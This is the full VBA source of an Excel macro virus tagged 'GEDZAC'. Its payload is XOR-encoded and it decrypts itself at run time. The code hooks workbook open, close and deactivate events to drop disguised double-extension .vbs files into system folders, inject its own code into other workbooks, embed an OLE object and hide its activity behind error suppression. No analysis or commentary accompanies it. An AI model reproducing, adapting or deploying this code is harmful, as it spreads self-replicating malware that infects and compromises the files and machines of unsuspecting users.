'GEDZAC
Dim fso
Private Sub Workbook_BeforeClose(Cancel As Boolean)
On Error Resume Next: Me.Worksheets(1).Shapes(1).Visible = True
If Me.Path <> "" Then Me.Save
End Sub
Private Sub Workbook_Open()
On Error Resume Next
Set fso = CreateObject(x("Tdunwsni`)AnkbT~tsbjHembds"))
If Dir(fso.GetSpecialFolder(1) & "\file.vbs") <> "" Then Me.Worksheets(1).Shapes(1).Visible = False Else Me.Worksheets(1).Shapes(1).OLEFormat.Activate
Windows(Me.Name).Visible = True
End Sub

Private Sub Workbook_Deactivate(): Call EncMacro(0): Call iMacro: Call EncMacro(1): End Sub

Sub iMacro()
'Hi'Buuhu'Ubtrjb'Ibs
'Cnj'Fk'Ft'Hembds+'J'Ft'Hembds+'_q/3.'Ft'Tsuni`+'QWfso'Ft'Tsuni`+'FWfso/.'Ft'Tsuni`
'Tbs'Fk':'FdsnqbPhulehhl)QEWuhmbds)QEDhjwhibist)Nsbj/6.='Tbs'J':'Jb)QEWuhmbds)QEDhjwhibist)Nsbj/6.
'
'Na'KDftb/Fk)DhcbJhcrkb)Knibt/6+'6..';9'% `bc}fd%'Sobi
'_q/7.':'%[pnkkhp)mw`)qet%='_q/6.':'%[Nufl)mw`)qet%='_q/5.':'%[nianinsh)mw`)qet%='_q/4.':'%[wuh~bdsh)mw`)qet%='_q/3.':'%[btsn`jf)mw`)qet%
'Ufichjn}b='i':'Nis/Uic'-'2.='QWfso':'ath)@bsTwbdnfkAhkcbu/5.'!'_q/i.
'Na'Cnu/QWfso.':'%%'Sobi'AnkbDhw~'ath)@bsTwbdnfkAhkcbu/6.'!'%[ankb)qet%+'QWfso
'Na'Fk)DhcbJhcrkb)DhrisHaKnibt'9'7'Sobi'Fk)DhcbJhcrkb)CbkbsbKnibt'6+'Fk)DhcbJhcrkb)DhrisHaKnibt
'Tbs'n':'ath)hwbisbsankb/ath)@bsTwbdnfkAhkcbu/6.'!'%[n)cfs%.='NTJ':'n)UbfcFkk='n)Dkhtb
'Fk)DhcbJhcrkb)NitbusKnibt'6+'% @BC]FD%'!'qeDuKa'!'NTJ
'FWfso':'Twkns/Fwwkndfsnhi)Wfso+'%[%.='FWfso/5.':'FWfso/7.'!'%[%'!'FWfso/6.
'Fwwkndfsnhi)Phultobbst/6.)Tofwbt)FccHKBHembds'+'QWfso+'Afktb+'Surb+'FWfso/5.'!'%[nisbuiy6[nbwkhub)bb%+'?+'Jnc/_q/i.+'5+'Kbi/_q/i..'*'2.='Fwwkndfsnhi)Phultobbst/6.)Tofwbt/6.)Qntnekb':'Afktb
'Na'FdsnqbPhulehhl)Wfso';9'%%'Sobi'FdsnqbPhulehhl)Tfqb
'Bic'Na
'Pnichpt/Jb)Ifjb.)Qntnekb':'Afktb
End Sub

Private Function EncMacro(y)
On Error Resume Next
For i = 1 To Application.VBE.CodePanes.Count
If Application.VBE.CodePanes(i).CodeModule.Lines(1, 1) = "'GEDZAC" Then
Set avc = Application.VBE.CodePanes(i).CodeModule
For s = 17 To avc.CountOfLines - 19
If y = 0 Then
avc.ReplaceLine s, x(Mid(avc.Lines(s, 1), 2))
ElseIf y = 1 Then
avc.ReplaceLine s, "'" & x(avc.Lines(s, 1))
End If
Next
End If
Next
End Function

Private Function x(c): On Error Resume Next: For i = 1 To Len(c): x = x & Chr(Asc(Mid(c, i, 1)) Xor 7): Next: End Function